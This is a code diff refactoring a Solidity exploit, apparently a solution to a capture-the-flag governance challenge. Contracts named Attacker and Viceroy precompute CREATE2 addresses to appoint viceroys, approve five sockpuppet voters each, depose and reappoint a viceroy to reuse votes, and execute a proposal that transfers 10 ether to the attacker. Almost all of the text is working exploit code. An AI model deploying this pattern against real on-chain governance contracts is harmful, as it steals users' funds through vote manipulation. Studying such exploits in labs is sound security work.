@@ -132,14 +132,11 @@ contract CommunityWallet {
 
 contract Attacker {
     CreateViceroyFactory private factory;
-    Viceroy private viceroy1;
-    Viceroy private viceroy2;
-
     address private governance;
 
-    uint256 constant ETH_AMOUNT = 10 ether;
     uint256 constant SALT1 = 1;
     uint256 constant SALT2 = 2;
+    uint256 constant ETH_AMOUNT = 10 ether;
     bytes PROPOSAL = abi.encodeWithSignature("exec(address,bytes,uint256)", address(this), "", ETH_AMOUNT);
 
     constructor() {
@@ -152,33 +149,34 @@ contract Attacker {
         governance = _governance;
     }
 
-    function attack() external {
+    function getViceroyAddress(uint256 _salt) public view returns (address) {
         bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
-        address viceroyAddress1 = factory.getAddress(bytecode, SALT1);
-        Governance(governance).appointViceroy(viceroyAddress1, 1);
-        viceroy1 = factory.deploy(SALT1, governance, PROPOSAL);
-        viceroy1.attack(1);
-        attack2();
-
-        Governance(governance).executeProposal(uint256(keccak256(PROPOSAL)));
+        return factory.getAddress(bytecode, _salt);
     }
 
-    function attack2() private {
-        bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
-        address viceroyAddress2 = factory.getAddress(bytecode, SALT2);
-        Governance(governance).deposeViceroy(address(viceroy1), 1);
-        Governance(governance).appointViceroy(viceroyAddress2, 1);
-        viceroy2 = factory.deploy(SALT2, governance, PROPOSAL);
-        viceroy2.attack(4);
+    function attack() external {
+        _attack(SALT1, 0, true);
+        _attack(SALT2, 4, false);
+    }
+
+    function _attack(uint256 _salt, uint256 _start, bool _depose) internal {
+        address viceroyAddress = getViceroyAddress(_salt);
+        Governance(governance).appointViceroy(viceroyAddress, 1);
+        Viceroy viceroy = factory.deploy(_salt, governance, PROPOSAL);
+        viceroy.attack(_start);
+        if (_depose) {
+            Governance(governance).deposeViceroy(address(viceroy), 1);
+        } else {
+            Governance(governance).executeProposal(uint256(keccak256(PROPOSAL)));
+        }
     }
 }
 
 contract Viceroy {
     CreateVoterFactory private factory;
-    Voter[] private voters;
 
-    address public governance;
-    bytes public proposal;
+    address private governance;
+    bytes private proposal;
 
     constructor(address _governance, bytes memory _proposal) {
         factory = new CreateVoterFactory();
@@ -186,29 +184,25 @@ contract Viceroy {
         proposal = _proposal;
     }
 
-    function attack(uint256 _startSalt) external {
+    function attack(uint256 _start) external {
         uint256 proposalId = uint256(keccak256(proposal));
 
-        for (uint256 i = _startSalt; i <= _startSalt + 4; i++) {
+        if (_start == 0) {
+            Governance(governance).createProposal(address(this), proposal);
+        }
+
+        for (uint256 i = _start; i < _start + 5; i++) {
             address voterAddress = getVoterAddress(i, proposalId);
             Governance(governance).approveVoter(voterAddress);
 
             Voter newVoter = factory.deploy(i, governance, proposalId, address(this));
-            voters.push(newVoter);
+            Voter(newVoter).vote();
         }
-        vote();
     }
 
     function getVoterAddress(uint256 _salt, uint256 proposalId) private view returns (address voterAddress) {
         bytes memory bytecode = factory.getBytecode(governance, proposalId, address(this));
         voterAddress = factory.getAddress(bytecode, _salt);
-    }
-
-    function vote() private {
-        Governance(governance).createProposal(address(this), proposal);
-        for (uint256 i = 0; i < voters.length; i++) {
-            voters[i].vote();
-        }
     }
 }
 
